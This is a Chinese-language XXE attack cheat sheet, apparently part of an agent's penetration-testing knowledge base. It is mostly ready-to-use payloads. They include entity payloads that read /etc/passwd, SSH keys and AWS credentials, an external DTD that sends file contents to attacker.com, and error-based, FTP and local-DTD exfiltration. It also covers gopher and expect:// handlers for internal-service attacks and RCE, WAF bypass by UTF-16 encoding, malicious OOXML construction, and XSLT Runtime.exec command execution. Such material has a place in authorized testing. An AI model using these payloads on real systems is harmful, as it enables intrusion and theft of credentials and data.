# XXE（XML 外部实体注入）专题

> 基础 payload、OOB 外带、本地 DTD 注入、协议 handler、XSLT 升级链。
> 上传链（SVG/OOXML 载体）与文件上传漏洞见 web-vulnerabilities.md §4；SSRF 见 §1.3。

---

## 1. 基础与攻击面

**经典 payload**：
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>
```
内容反射 = 确认文件读。

**攻击面**：SOAP 端点（`text/xml`/`soap+xml`）｜REST 收 `application/xml`｜RSS/Atom｜XML 配置导入｜OOXML 上传（.docx/.xlsx/.pptx）｜SVG（SVG 即 XML）｜GPX｜**任意 JSON POST 改 `Content-Type: application/xml` 重写 body**（双格式解析器）｜HTML→PDF（wkhtmltopdf/PrinceXML 解析内嵌 SVG 实体）｜SAML Response（base64 解码注入 DOCTYPE 再编码）。

**检测清单**：内部实体 `<!ENTITY xxe "test">` 看反射 → `file:///etc/passwd` → 无反射转 OOB → DOCTYPE 禁试 XInclude。

**文件读取目标**：`/proc/self/environ`（环境变量凭据）、`/proc/self/cmdline`、`~/.ssh/id_rsa`、`~/.aws/credentials`、`~/.bash_history`、access.log；Windows：`web.config`（连接串）、`wp-config.php`。

## 2. 盲 XXE 与 OOB

**盲检测**：`<!ENTITY xxe SYSTEM "http://COLLABORATOR/">` 回调即确认。**纯 SSRF 探测**（无需实体反射）：`<!DOCTYPE foo PUBLIC "-//a//DTD//EN" "http://attacker/notify">`。

**攻击者 DTD 外带**（attacker.com/evil.dtd）：
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % exfil "<!ENTITY exfiltrate SYSTEM 'http://attacker.com/?data=%file;'>">
%exfil;
```
目标发 `<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">%dtd;`。

**错误型 OOB**（HTTP 出网被禁）：
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY % error SYSTEM 'file:///NONEXISTENT/%file;'>">
%eval; %error;
```
报错信息含文件内容。变体：`jar:` 协议触发更详细报错。

**FTP 逐行外带**：HTTP 外带遇换行截断时，`ftp://attacker:2121/%file;` + rogue FTP（xxeserv），每行独立到达。**base64 外带**：file 实体读 `php://filter/convert.base64-encode/resource=...` 再进 URL 参数。

**参数实体嵌套绕 WAF**：双层 `%a` → `%b` → 外部 DTD；三层 stage1/stage2.dtd 链，文件读发生在两次拉取后，躲浅层检查。

## 3. 本地 DTD 注入（外连全禁时）

覆盖本地 DTD 已有实体（实体名必须真实存在于该 DTD，如 docbookx.dtd 的 `ISOamso`）：
```xml
<!DOCTYPE foo [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamso '<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval; &#x25;error;'>
  %local_dtd;
]>
```

**本地 DTD 路径**：Linux `/usr/share/yelp/dtd/docbookx.dtd`、`/usr/share/xml/fontconfig/fonts.dtd`、`/usr/share/sgml/docbook/*/docbookx.dtd`、struts/nmap/zaproxy dtd；Windows `wbem\xml\cim20.dtd`、WebSphere；Java `jar:file:///...tomcat-*.jar!/javax/servlet/resources/web-app_2_3.dtd`。

## 4. 协议 handler 与绕过

| Handler | 用法 |
|---|---|
| `http://` | SSRF（含 `http://169.254.169.254/...` 云元数据） |
| `file://` | 文件读 |
| `php://filter/...base64-encode/resource=` | 编码读，解决二进制/换行 |
| `ftp://` | 外带 + 端口扫描 |
| `gopher://127.0.0.1:6379/info%0d%0a` | 打内网 Redis/SMTP |
| `expect://id` | PHP expect 扩展直接 RCE（phpinfo 查扩展） |
| `jar:` | Java，触发详细报错 |

**XInclude**（DOCTYPE 被禁时）：`<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd" parse="text"/></foo>`（Cocoon/Xerces-J/libxml2 开启 XInclude）。

**WAF 拦截 XML 时编码降级绕过**：payload 转 UTF-16/UTF-16BE 后 WAF 按 UTF-8 解析失效而 XML parser 按 declaration 正常解析——`iconv -f utf-8 -t utf-16be payload.xml > out.xml`（UTF-16 不行再试 UTF-16BE/文件另存 UTF-16）; 注意 bp 内置编辑器对多字节编辑不可靠，本地编辑器写好再整段粘贴。

**OOXML 操作流**：unzip → `word/document.xml`（或 xlsx 的 `xl/sharedStrings.xml`、`[Content_Types].xml`）的 XML 声明后插 DOCTYPE，文本/`<t>` 处引 `&xxe;` → `zip -r ../malicious.docx .` 上传。不渲染也有效——Apache POI/python-docx/OpenXML SDK 导入时处理实体触发 OOB。

## 5. XSLT 注入与升级链

> 专题深化（引擎指纹与能力矩阵/unparsed-text 任意文本读/写入三通道 result-document+exsl+redirect/.NET msxsl:script/盲利用/WAF 绕过）见 `$AGENT_DIR/knowledge-base/xslt-injection.md`。

**document() 读文件**：`<xsl:value-of select="document('file:///etc/passwd')"/>`。

**RCE**：Xalan-J 声明 `xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"` 后 `rt:getRuntime()` + `rt:exec($rtObj,'id')`；PHP 启用 registerPHPFunctions 时 `php:function('system','id')`。

**XXE→XSLT 链**：目标收带 `<?xml-stylesheet?>` 的 XML 时，同时注入实体和恶意 XSLT。

**Apache Solr CVE-2017-12629**：XXE 读配置识别 cores → Config API 注册 VelocityResponseWriter（`solr.resource.loader.enabled=true`）→ Velocity 模板 `Runtime.exec()`。

**渲染通道外带（像素）**: SVG→PNG 转换链（svglib/cairosvg/librsvg）在光栅化前展开实体——文件内容被画进 PNG 像素（grep 无效，看图/OCR）。CairoSVG 大文件加 width~20000（>34000 超时）防裁剪; 先 /proc/self/status 拿 PID 再探 /proc/<pid>/cwd/flag.txt。**JavaMelody <1.74** 监控端点 XXE（CVE-2018-15531）。
